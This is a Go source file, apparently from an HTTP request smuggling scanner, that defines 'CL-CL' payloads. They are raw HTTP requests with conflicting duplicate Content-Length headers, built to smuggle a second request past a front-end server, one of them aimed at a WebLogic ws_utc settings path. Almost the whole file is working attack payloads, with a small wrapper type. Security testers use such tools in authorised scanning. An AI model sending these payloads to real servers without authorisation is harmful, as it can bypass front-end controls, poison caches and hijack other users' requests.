package Smuggling

var ClClPayload = []string{`
POST %s HTTP/1.1
Host: %s%s
Connection: Keep-Alive
Content-Length: 6
Content-Length: 5

12345GPOST / HTTP/1.1
Host: localhost

`, `POST %s HTTP/1.1
Host: %s%s
Connection: Keep-Alive
Content-Length: 0
Content-Length: 109

GET /ws_utc/resources/setting/options/general?timestamp=1571211853278 HTTP/1.1
Host: localhost
Bla:   Bla:GET /ws_utc/resources/setting/options/general?timestamp=1571211853278 HTTP/1.1
Host: localhost
Connection: Keep-Alive

`}

func init() {
	for n, x := range ClClPayload {
		x = E2EC(x)
		ClClPayload[n] = x
	}
}

type ClCl struct {
	Base
}

func NewClCl() *ClCl {
	x := &ClCl{}
	x.Type = "CL-CL"
	x.Payload = ClClPayload
	return x
}
